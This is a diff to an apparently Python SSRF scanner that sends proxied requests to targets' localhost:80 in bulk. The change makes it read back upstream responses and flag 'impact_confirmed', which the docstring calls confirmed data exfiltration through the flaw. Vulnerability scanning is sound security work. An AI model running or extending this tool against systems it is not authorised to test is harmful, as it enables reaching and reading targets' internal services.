@@ -41,6 +41,7 @@ from __future__ import annotations
 import argparse
 import asyncio
 import json
+import re
 import secrets
 import ssl
 import sys
@@ -50,6 +51,8 @@ from urllib.parse import urlsplit
 DEFAULT_TIMEOUT = 5.0
 DEFAULT_CONCURRENCY = 10
 DEFAULT_PROBE_PATH = "/x"  # arbitrary; becomes the path on localhost:80 of the target
+
+HTTP_STATUS_RE = re.compile(r"^HTTP/1\.\d (\d{3}) ")
 
 
 def build_payload(absolute_uri: str, target_host_header: str) -> bytes:
@@ -78,15 +81,31 @@ def parse_target(url: str) -> tuple[str, int, bool]:
     return host, port, is_tls
 
 
-def classify(snippet: str) -> str:
-    """Map the raw bytes of the socket reply to a verdict."""
+def classify(snippet: str) -> tuple[str, bool, dict]:
+    """Map the raw bytes of the socket reply to (verdict, impact_confirmed, extras).
+
+    impact_confirmed is True iff the response shows that the proxied upgrade
+    actually reached a service on the target's localhost:80/443 and read
+    something back — i.e. real data exfiltration through the SSRF gadget.
+    """
+    extras: dict = {}
     if not snippet:
-        return "likely_patched"
-    if "Internal Server Error" in snippet:
-        return "vulnerable"
+        return "likely_patched", False, extras
     if snippet.startswith("HTTP/1."):
-        return "vulnerable_proxy_succeeded"
-    return "inconclusive"
+        m = HTTP_STATUS_RE.match(snippet)
+        if m:
+            extras["upstream_status"] = int(m.group(1))
+        # parse a few common headers from the first chunk for operator triage
+        for line in snippet.split("\r\n")[1:15]:
+            low = line.lower()
+            if low.startswith("server:"):
+                extras["upstream_server"] = line.split(":", 1)[1].strip()
+            elif low.startswith("content-type:"):
+                extras["upstream_content_type"] = line.split(":", 1)[1].strip()
+        return "vulnerable_proxy_succeeded", True, extras
+    if "Internal Server Error" in snippet:
+        return "vulnerable", False, extras
+    return "inconclusive", False, extras
 
 
 async def probe_one(
@@ -100,7 +119,7 @@ async def probe_one(
         host, port, is_tls = parse_target(target)
     except ValueError as e:
         return {"target": target, "token": token, "status": "invalid",
-                "verdict": "error", "error": str(e)}
+                "verdict": "error", "impact_confirmed": False, "error": str(e)}
 
     host_header = host if port in (80, 443) else f"{host}:{port}"
     # absolute-form request-URI; the path includes the token so log inspection
@@ -124,27 +143,37 @@ async def probe_one(
             )
     except (asyncio.TimeoutError, OSError, ssl.SSLError) as e:
         return {"target": target, "token": token, "status": "connect_error",
-                "verdict": "error", "error": str(e)}
+                "verdict": "error", "impact_confirmed": False, "error": str(e)}
 
     try:
         writer.write(payload)
         await writer.drain()
+        # read until close (or timeout) — caps so we don't grow unbounded on
+        # a chatty upstream
+        data = b""
         try:
-            data = await asyncio.wait_for(reader.read(4096), timeout=timeout)
+            while len(data) < 8192:
+                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
+                if not chunk:
+                    break
+                data += chunk
         except asyncio.TimeoutError:
-            data = b""
+            pass
         snippet = data.decode("latin-1", "replace")
-        verdict = classify(snippet)
-        return {
+        verdict, impact_confirmed, extras = classify(snippet)
+        result = {
             "target": target,
             "token": token,
             "status": "sent",
             "verdict": verdict,
-            "response_snippet": snippet[:300].replace("\r", " ").replace("\n", " "),
+            "impact_confirmed": impact_confirmed,
+            "response_snippet": snippet[:500].replace("\r", " ").replace("\n", " "),
         }
+        result.update(extras)
+        return result
     except OSError as e:
         return {"target": target, "token": token, "status": "send_error",
-                "verdict": "error", "error": str(e)}
+                "verdict": "error", "impact_confirmed": False, "error": str(e)}
     finally:
         try:
             writer.close()
@@ -229,21 +258,34 @@ def main() -> int:
             print(json.dumps(r))
         else:
             tag = VERDICT_GLYPH.get(r["verdict"], r["verdict"])
-            line = f"[{tag:>5}] target={r['target']:<50} verdict={r['verdict']}"
-            if "response_snippet" in r and r["response_snippet"]:
-                snip = r["response_snippet"][:80]
-                line += f"  snippet={snip!r}"
+            impact = "YES" if r.get("impact_confirmed") else " no"
+            line = (
+                f"[{tag:>5}] target={r['target']:<40}"
+                f"  verdict={r['verdict']:<28}  impact={impact}"
+            )
+            if r.get("upstream_status"):
+                line += f"  upstream={r['upstream_status']}"
+            if r.get("upstream_server"):
+                line += f" ({r['upstream_server']!r})"
             if "error" in r:
                 line += f"  error={r['error']}"
             print(line)
+            if r.get("impact_confirmed") and r.get("response_snippet"):
+                print(f"        snippet: {r['response_snippet'][:200]!r}")
+            elif r.get("response_snippet") and r["verdict"] == "vulnerable":
+                print(f"        snippet: {r['response_snippet'][:80]!r}")
 
     if not args.json:
         counts: dict[str, int] = {}
+        impacts = 0
         for r in results:
             counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
+            if r.get("impact_confirmed"):
+                impacts += 1
         print()
         for verdict, n in sorted(counts.items()):
             print(f"  {verdict}: {n}")
+        print(f"  impact_confirmed: {impacts}")
     return 0
 
 
